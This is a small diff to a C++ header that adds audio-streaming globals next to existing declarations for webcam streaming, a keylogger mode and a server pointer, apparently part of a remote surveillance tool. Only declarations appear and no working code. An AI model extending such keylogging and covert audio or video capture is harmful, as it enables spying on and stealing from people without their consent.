@@ -53,6 +53,10 @@ extern std::set<DWORD> g_PendingModifiers;
 extern bool g_IsStreaming;
 extern std::thread* g_WebcamThread;
 
+// Audio streaming
+extern bool g_IsStreamingAudio;
+extern std::thread* g_AudioThread;
+
 // Keylogger Mode: "buffer" hoặc "realtime"
 extern std::string g_KeylogMode;
 extern server* g_ServerPtr;
